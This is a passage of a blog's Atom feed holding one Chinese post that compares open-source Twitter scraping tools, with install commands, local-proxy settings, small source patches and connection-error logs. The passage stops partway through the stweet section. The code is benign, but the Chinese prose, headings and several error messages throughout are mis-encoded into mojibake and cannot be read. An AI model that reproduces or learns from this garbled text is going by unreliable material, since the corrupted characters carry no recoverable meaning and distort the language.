<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jckling&#39;s Blog</title>
  
  
  <link href="https://jckling.github.io/atom.xml" rel="self"/>
  
  <link href="https://jckling.github.io/"/>
  <updated>2021-10-11T13:39:04.665Z</updated>
  <id>https://jckling.github.io/</id>
  
  <author>
    <name>Jckling</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python çˆ¬å– twitter æ•°æ®</title>
    <link href="https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/"/>
    <id>https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/</id>
    <published>2021-10-11T10:44:50.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ¥åˆ°ä¸€ä¸ªéœ€æ±‚ï¼šçˆ¬åŒ…å«å…³é”®å­—çš„æ¨æ–‡ã€‚åæ¥æ‰å‘Šè¯‰æˆ‘è½¬äº¤ç»™åˆ«äººåšäº†ï¼ˆæ‘Šæ‰‹ï¼‰ï¼Œé‚£è¿™é‡Œå°±åˆ†äº«ä¸€ä¸‹å¦‚ä½•çˆ¬å– twitter æ•°æ®ã€‚<br><em>ç»“æœæˆ‘æ‹–äº†ä¸¤å‘¨æ‰å¼€å§‹æ¢³ç†</em> ğŸ˜‚</p><h1 id="Twitter-API"><a href="#Twitter-API" class="headerlink" title="Twitter API"></a>Twitter API</h1><p>æ¨ç‰¹æä¾›äº† Twitter APIï¼Œå¯ä»¥ç”¨äºæŸ¥è¯¢æ¨ç‰¹æ•°æ®ï¼Œä¸ªäººä½¿ç”¨çš„è¯æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š</p><ol><li>Twitter API v2</li><li>Standard v1.1</li></ol><p>å½“ç„¶è¿˜æœ‰é«˜çº§ç‰ˆå’Œä¼ä¸šç‰ˆï¼š</p><ol><li>Premium v1.1</li><li>Enterprise</li></ol><p>æ ‡å‡†ç‰ˆä»…æ”¯æŒæœç´¢ 7 å¤©å†…çš„æ¨ç‰¹ï¼Œå…¶ä½™éƒ½æ”¯æŒå…¨æœç´¢ï¼ˆä» 2006.03 å¼€å§‹ï¼‰ï¼Œå®˜æ–¹ç»™å‡ºäº†æ¯”è¾ƒï¼š<a href="https://developer.twitter.com/en/docs/twitter-api/tweets/search/migrate">Comparing Twitter APIâ€™s Search Tweets endpoints</a> ã€‚</p><p>ä½¿ç”¨æ ‡å‡†ç‰ˆéœ€è¦ç”³è¯·å¼€å‘è€…è´¦æˆ·<a href="https://developer.twitter.com/en/apply/user.html">Apply for a developer account</a>ï¼Œä½¿ç”¨ v2 ç‰ˆæœ¬çš„éœ€è¦ç”³è¯· <a href="https://developer.twitter.com/en/products/twitter-api/academic-research">Academic Research product track</a>ã€‚æˆ‘è¯•äº†ç”³è¯·å¼€å‘è€…è´¦æˆ·ï¼Œç„¶åå¦¥å¦¥åœ°è¢«æ‹’ç»äº†ï¼Œæœ‰äººè¯´éœ€è¦ç¾å›½è´¦æˆ·/æ‰‹æœºå·ä¹‹ç±»çš„ä¿¡æ¯ï¼Œå› ä¸ºä¸æƒ³æ‹¿è‡ªç”¨çš„æ¨ç‰¹çæµ‹è¯•ï¼Œä¹Ÿå°±ç½¢äº†ã€‚</p><img src="https://i.loli.net/2021/10/11/YouCXye5JHLgNDZ.png" width="85%"><p>è¿™é‡Œçš„ç›®æ ‡æ˜¯æœç´¢ç‰¹å®šæ—¶é—´èŒƒå›´å†…ï¼ŒåŒ…å«ç‰¹å®šå…³é”®è¯çš„ tweetsï¼ˆå³ï¼Œæ¨æ–‡ï¼‰ï¼Œå› æ­¤å°±ç®—ç”³è¯·åˆ°äº†ä¹Ÿä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œè½¬è€Œå¯»æ±‚å¼€æºè§£å†³æ–¹æ¡ˆã€‚</p><h1 id="å¼€æºè§£å†³æ–¹æ¡ˆ"><a href="#å¼€æºè§£å†³æ–¹æ¡ˆ" class="headerlink" title="å¼€æºè§£å†³æ–¹æ¡ˆ"></a>å¼€æºè§£å†³æ–¹æ¡ˆ</h1><p>æœç´¢ GitHub ä¸Šçˆ¬å– twitter æ•°æ®çš„å¼€æºé¡¹ç›®ï¼Œç­›é€‰å‡ºä»¥ä¸‹ 9 ä¸ªè¯•ç”¨ï¼ˆæŒ‰ star æ•°é‡æ’åˆ—ï¼‰ï¼š</p><table><thead><tr><th>åç§°</th><th>star</th><th>æœ€åä¸€æ¬¡æ›´æ–°</th><th>æ˜¯å¦å¯ç”¨</th></tr></thead><tbody><tr><td><a href="https://github.com/twintproject/twint">twint</a></td><td>11.7k</td><td>2021.03.03</td><td>âŒ</td></tr><tr><td><a href="https://github.com/tweepy/tweepy">tweepy</a></td><td>8.1k</td><td>2021.10.07</td><td>âœ”ï¸ï¼ˆéœ€è¦ç”³è¯· Twitter APIï¼‰</td></tr><tr><td><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></td><td>3k</td><td>2021.1.10</td><td>âŒ</td></tr><tr><td><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></td><td>1.9k</td><td>2020.7.28</td><td>âŒ</td></tr><tr><td><a href="https://github.com/Altimis/Scweet">Scweet</a></td><td>215</td><td>2021.10.08</td><td>âœ”ï¸</td></tr><tr><td><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></td><td>122</td><td>2020.06.04</td><td>âŒ</td></tr><tr><td><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></td><td>67</td><td>2020.12.16</td><td>âŒ</td></tr><tr><td><a href="https://github.com/markowanga/stweet">stweet</a></td><td>57</td><td>2021.02.26</td><td>âœ”ï¸</td></tr><tr><td><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></td><td>6</td><td>2019.12.15</td><td>âŒ</td></tr></tbody></table><h2 id="twint"><a href="#twint" class="headerlink" title="twint"></a><a href="https://github.com/twintproject/twint">twint</a></h2><p>ä¸ç”¨ Twitter API çˆ¬å–æ¨æ–‡ï¼Œæ”¯æŒæ ‡ç­¾ã€è¶‹åŠ¿ã€æ•æ„Ÿä¿¡æ¯ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒçˆ¬å–ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…³æ³¨è€…ã€æ¨æ–‡ã€‚</p><ol><li><p>å®‰è£…</p><p> ç›´æ¥ä» pypi å®‰è£…çš„åŒ…ç‰ˆæœ¬è¾ƒä½ï¼Œéœ€è¦å‡çº§</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade git+https://github.com/twintproject/twint.git@origin/master<span class="comment">#egg=twint</span></span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> é…ç½®ä¸€ä¸ªä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> twint</span><br><span class="line"></span><br><span class="line">c = twint.Config()</span><br><span class="line">c.Proxy_host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">c.Proxy_port = <span class="string">&#x27;7890&#x27;</span></span><br><span class="line">c.Proxy_type = <span class="string">&#x27;http&#x27;</span></span><br><span class="line"></span><br><span class="line">c.Store_csv = <span class="literal">True</span></span><br><span class="line">c.Output = <span class="string">&quot;tweets.csv&quot;</span></span><br><span class="line"></span><br><span class="line">c.Limit = <span class="number">10</span></span><br><span class="line">c.Custom_query = <span class="string">&quot;nijisanji&quot;</span></span><br><span class="line"></span><br><span class="line">twint.run.Search(c)</span><br></pre></td></tr></table></figure><p> ç„¶åæŒ‚æ‰</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING:root:Error retrieving https://twitter.com/: ConnectTimeout(MaxRetryError(<span class="string">&quot;HTTPSConnectionPool(host=&#x27;twitter.com&#x27;, port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPSConnection object at 0x000001D2C5A295B0&gt;, &#x27;Connection to twitter.com timed out. (connect timeout=10)&#x27;))&quot;</span>)), retrying</span><br></pre></td></tr></table></figure><p> ç¿»äº†ç¿» issue æœ‰äººåœ¨äºŒæœˆä»½ä¿®å¤äº†ï¼š<a href="https://github.com/twintproject/twint/pull/1138">Fix the bug that proxy cannot be used when get token #1138</a>ï¼Œä½†æ²¡æœ‰åˆå¹¶ã€‚</p><p> é¡ºä¾¿å‘ç°æœ‰äººæè®¾ç½®æ—¶é—´èŒƒå›´çš„ <code>since</code> å’Œ <code>until</code> å¤±æ•ˆäº†</p><ul><li><a href="https://github.com/twintproject/twint/issues/1281">c.Since and c.Until not getting all tweets #1281</a></li><li><a href="https://github.com/twintproject/twint/issues/1261">Since~Until doesnâ€™t work anymore #1261</a></li></ul></li><li><p>æ€»ç»“</p><p> è‡ªå·±è¯•ç€ä¿®æ”¹æˆ–è€…ç­‰ä¸€ä¸ªå¤§æ›´æ–°ï¼Œå››ç™¾å¤šçš„ issue çœ‹æ¥æ˜¯æ²¡æœ‰å¤ªå¤šçš„ç²¾åŠ›ä¿®å•ŠğŸ˜…</p></li></ol><h2 id="tweepy"><a href="#tweepy" class="headerlink" title="tweepy"></a><a href="https://github.com/tweepy/tweepy">tweepy</a></h2><p>å®é™…ä¸Šå°±æ˜¯å¯¹ twitter API çš„å°è£…ï¼Œä¸ç”¨ä»é›¶æ‰‹å†™è¯·æ±‚å’Œå¤„ç†æ•°æ®ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tweepy</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> æ²¡æœ‰ç”³è¯·åˆ°å¼€å‘è€…è´¦æˆ·ï¼Œè·³è¿‡ï¼</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tweepy</span><br><span class="line"></span><br><span class="line">auth = tweepy.OAuthHandler(consumer_key, consumer_secret)</span><br><span class="line">auth.set_access_token(access_token, access_token_secret)</span><br><span class="line"></span><br><span class="line">api = tweepy.API(auth)</span><br><span class="line"></span><br><span class="line">public_tweets = api.home_timeline()</span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> public_tweets:</span><br><span class="line">    print(tweet.text)</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> Twitter API v2 çš„æ”¯æŒè¿˜åœ¨å¼€å‘ä¸­ï¼Œç”³è¯·åˆ°å¼€å‘è€…è´¦æˆ·çš„å°±ç”¨å®ƒå§ï¼</p></li></ol><h2 id="twitter-scraper"><a href="#twitter-scraper" class="headerlink" title="twitter-scraper"></a><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></h2><p>æ”¯æŒæ ‡ç­¾ã€è¶‹åŠ¿ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒç”¨æˆ·ä¿¡æ¯çš„æœç´¢ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitter_scraper</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> å› ä¸ºæ²¡æœ‰æä¾›è®¾å€¼ä»£ç†çš„é€‰é¡¹ï¼Œæ‰€ä»¥ç›´æ¥åœ¨æœ¬åœ°å¼€å…¨å±€æ¨¡å¼ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twitter_scraper <span class="keyword">import</span> get_tweets</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> get_tweets(<span class="string">&#x27;twitter&#x27;</span>):</span><br><span class="line">    print(tweet[<span class="string">&#x27;text&#x27;</span>])</span><br></pre></td></tr></table></figure><p> æŠ¥é”™ğŸ˜…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ProxyError: HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /i/profiles/show/twitter/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;include_new_items_bar=<span class="literal">true</span> (Caused by ProxyError(<span class="string">&#x27;Cannot connect to proxy.&#x27;</span>, OSError(0, <span class="string">&#x27;Error&#x27;</span>)))</span><br></pre></td></tr></table></figure><p> æ”¹ä¸‹æºç ï¼ŒæŠ¥é”™åœ¨ tweets.py è¿™ä¸ªæ–‡ä»¶ï¼Œæ·»åŠ ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tweets</span>(<span class="params">query, pages=<span class="number">25</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_tweets</span>(<span class="params">pages</span>):</span></span><br><span class="line">        proxy = <span class="string">&#x27;http://127.0.0.1:7890&#x27;</span></span><br><span class="line">        r = session.get(url, headers=headers, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: proxy, <span class="string">&#x27;https&#x27;</span>: proxy&#125;)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p> é‡æ–°æ‰§è¡Œï¼Œæ–°çš„æŠ¥é”™ğŸ˜…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> ä½œè€…è¯´ç°åœ¨å·²ç»æ— æ³•ä½¿ç”¨äº†ï¼ˆ<a href="https://github.com/bisguzar/twitter-scraper/issues/191">Does this work? #191</a>ï¼‰ï¼Œè€Œä¸”è‡ªå·±å¿™äºå·¥ä½œæš‚æ—¶æ²¡æ—¶é—´æ›´æ–°ï¼ˆ<a href="https://github.com/bisguzar/twitter-scraper/issues/189#issuecomment-832690515">Doesnâ€™t scrap anything. #189</a>ï¼‰ï¼Œæš‚ä¸”è§‚æœ›å§ã€‚</p></li></ol><h2 id="twitterscraper"><a href="#twitterscraper" class="headerlink" title="twitterscraper"></a><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></h2><p>æ‰€ä»¥ä¸ºä»€ä¹ˆè¦èµ·ä¸€æ ·çš„åå­—ï¼Ÿï¼</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitterscraper</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> ç›´æ¥ä¸Šå‘½ä»¤è¡Œäº†ï¼Œä½†æ˜¯æ— æ³•è®¿é—®é»˜è®¤ä»£ç† <a href="https://free-proxy-list.net/">https://free-proxy-list.net</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twitterscraper Trump --<span class="built_in">limit</span> 1000 --output=tweets.json</span><br></pre></td></tr></table></figure><p> æŠ¥é”™</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectionError: HTTPSConnectionPool(host=<span class="string">&#x27;free-proxy-list.net&#x27;</span>, port=443): Max retries exceeded with url: / (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x0000019FAE33BDC0&gt;: Failed to establish a new connection: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚&#x27;</span>))</span><br></pre></td></tr></table></figure><p> ä¿®æ”¹æºç  query.pyï¼Œç›´æ¥è¿”å›æœ¬åœ°ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxies</span>():</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;127.0.0.1:7890&#x27;</span>]</span><br><span class="line">    response = requests.get(PROXY_URL)</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    table = soup.find(<span class="string">&#x27;table&#x27;</span>,<span class="built_in">id</span>=<span class="string">&#x27;proxylisttable&#x27;</span>)</span><br><span class="line">    list_tr = table.find_all(<span class="string">&#x27;tr&#x27;</span>)</span><br><span class="line">    list_td = [elem.find_all(<span class="string">&#x27;td&#x27;</span>) <span class="keyword">for</span> elem <span class="keyword">in</span> list_tr]</span><br><span class="line">    list_td = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="literal">None</span>, list_td))</span><br><span class="line">    list_ip = [elem[<span class="number">0</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_ports = [elem[<span class="number">1</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_proxies = [<span class="string">&#x27;:&#x27;</span>.join(elem) <span class="keyword">for</span> elem <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(list_ip, list_ports))]</span><br><span class="line">    <span class="keyword">return</span> list_proxies               </span><br></pre></td></tr></table></figure><p> è¾“å‡ºè¯·æ±‚å‚æ•°ï¼Œç„¶åæŠ¥é”™â€¦</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">INFO:twitterscraper:queries: [<span class="string">&#x27;Trump since:2006-03-21 until:2006-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2006-12-30 until:2007-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2007-10-10 until:2008-07-20&#x27;</span>, <span class="string">&#x27;Trump since:2008-07-20 until:2009-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2009-04-30 until:2010-02-08&#x27;</span>, <span class="string">&#x27;Trump since:2010-02-08 until:2010-11-19&#x27;</span>, <span class="string">&#x27;Trump since:2010-11-19 until:2011-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2011-08-31 until:2012-06-10&#x27;</span>, <span class="string">&#x27;Trump since:2012-06-10 until:2013-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2013-03-21 until:2013-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2013-12-30 until:2014-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2014-10-10 until:2015-07-21&#x27;</span>, <span class="string">&#x27;Trump since:2015-07-21 until:2016-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2016-04-30 until:2017-02-09&#x27;</span>, <span class="string">&#x27;Trump since:2017-02-09 until:2017-11-20&#x27;</span>, <span class="string">&#x27;Trump since:2017-11-20 until:2018-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2018-08-31 until:2019-06-11&#x27;</span>, <span class="string">&#x27;Trump since:2019-06-11 until:2020-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2020-03-21 until:2020-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2020-12-30 until:2021-10-11&#x27;</span>]</span><br><span class="line">ConnectionError HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /search?f=tweets&amp;vertical=default&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x000002975B91D430&gt;: Failed to establish a new connection: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´</span></span><br><span class="line"><span class="string">åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚&#x27;</span>)) <span class="keyword">while</span> requesting <span class="string">&quot;https://twitter.com/search?f=tweets&amp;vertical=defa</span></span><br><span class="line"><span class="string">ult&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None&quot;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connection.py&quot;</span>, line 174, <span class="keyword">in</span> _new_conn</span><br><span class="line">    conn = connection.create_connection(</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 96, <span class="keyword">in</span> create_connection</span><br><span class="line">    raise err</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 86, <span class="keyword">in</span> create_connection</span><br><span class="line">    sock.connect(sa)</span><br><span class="line">TimeoutError: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“ </p><p> ç¿»äº†ç¿» issueï¼šæ²¡æ³•ç”¨ï¼Œç­‰æ›´æ–°ã€‚</p></li></ol><h2 id="Scweet"><a href="#Scweet" class="headerlink" title="Scweet"></a><a href="https://github.com/Altimis/Scweet">Scweet</a></h2><p>æ”¯æŒå…³é”®è¯ã€æ ‡ç­¾ã€æ—¶é—´èŒƒå›´ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒç”¨æˆ·ä¿¡æ¯ã€å…³æ³¨ã€å…³æ³¨è€…çš„çˆ¬å–ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Scweet==1.6</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> ç”¨ selenium æ¨¡æ‹Ÿæµè§ˆå™¨è®¿é—®ï¼Œç«Ÿç„¶è¿˜ä¸æ˜¯ headless æ¨¡å¼ï¼Œç›´æ¥ç»™æˆ‘å¼¹å‡ºä¸€ä¸ªçª—å£å¯è¿˜è¡Œã€‚æ³¨æ„è¿™é‡Œä¸æ˜¯æœ¬åœ°æ—¶é—´ï¼Œæ˜¯ UTC æ—¶é—´ï¼›å­˜å‚¨æ ¼å¼ä¸º UTF-8ã€‚</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Scweet.scweet <span class="keyword">import</span> scrape</span><br><span class="line"></span><br><span class="line">data = scrape(words=[<span class="string">&quot;nijisanji&quot;</span>], since=<span class="string">&quot;2020-01-01&quot;</span>, until=<span class="string">&quot;2021-01-01&quot;</span>, from_account=<span class="literal">None</span>,</span><br><span class="line">            interval=<span class="number">1</span>,</span><br><span class="line">            headless=<span class="literal">False</span>, display_type=<span class="string">&quot;Latest&quot;</span>, save_images=<span class="literal">False</span>, proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>, save_dir=<span class="string">&#x27;outputs&#x27;</span>,</span><br><span class="line">            resume=<span class="literal">False</span>, filter_replies=<span class="literal">True</span>, proximity=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p> ç»“æœçˆ¬äº† 175 æ¡æ•°æ®</p> <img src="https://i.loli.net/2021/10/11/iO3AjzBJUMm8th4.png"></li><li><p>æ€»ç»“</p><p> å¯ä»¥ç”¨ï¼æš‚æ—¶æ²¡é‡åˆ°ä»€ä¹ˆé—®é¢˜ï¼Œç”¨å®ƒï¼</p></li></ol><h2 id="SearchTT"><a href="#SearchTT" class="headerlink" title="SearchTT"></a><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></h2><p>è¿˜å†™äº†ä¸€ç¯‡çŸ¥ä¹æ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/87931509">è¿™å¯èƒ½æ˜¯æ˜¯ä¸­æ–‡ç½‘ä¸Šå…³äºTwitterä¿¡æ¯æ£€ç´¢çˆ¬è™«æœ€å…¨çš„é¡¹ç›®äº†</a></p><p>æè¿°å«ç³Šã€ä»“åº“ä¸æ›´æ–°ã€ç”šè‡³è¿˜æ›¾å‡ºç§Ÿ APIï¼ˆè¯„è®ºé‡Œçœ‹èµ·æ¥å¯èƒ½æ˜¯ï¼‰ï¼Œæ‹‰å€’ğŸ™‚ã€‚</p><h2 id="Twitter-Hashtag-crawler"><a href="#Twitter-Hashtag-crawler" class="headerlink" title="Twitter Hashtag crawler"></a><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></h2><p>æ ¹æ®æ ‡ç­¾ï¼ˆhashtagï¼‰æœç´¢</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/amitupreti/Hands-on-WebScraping</span><br><span class="line"><span class="built_in">cd</span> Hands-on-WebScraping/project1_twitter_hashtag_crawler</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p> æŠ¥é”™</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Could not find a version that satisfies the requirement dateutil (from versions: none)</span><br><span class="line">ERROR: No matching distribution found <span class="keyword">for</span> dateutil</span><br></pre></td></tr></table></figure><p> ä½†æ˜¯æœ¬åœ°å·²ç»æœ‰äº† dateutil</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install python-dateutil --upgrade</span><br><span class="line"><span class="comment"># Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: python-dateutil in c:\users\linki\desktop\t\lib\site-packages (2.8.2)</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: six&gt;=1.5 in c:\users\linki\desktop\t\lib\site-packages (from python-dateutil) (1.16.0)</span></span><br></pre></td></tr></table></figure><p> ç›´æ¥è£…ä¸ª scrapy å¾—äº†</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">pip install ipdb</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> æ²¡æœ‰ç»™ä»£ç†é…ç½®çš„å…¥å£ï¼Œæ˜¾ç„¶è¿ä¸ä¸Š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl twittercrawler -a filename=myhashtags.csv -o mydata.csv</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> èƒ½å¤Ÿè‡ªå®šä¹‰çš„é…ç½®é¡¹å¤ªå°‘ï¼Œè€Œä¸”ä»…é’ˆå¯¹æ ‡ç­¾æœç´¢ï¼Œè·³è¿‡ã€‚</p></li></ol><h2 id="stweet"><a href="#stweet" class="headerlink" title="stweet"></a><a 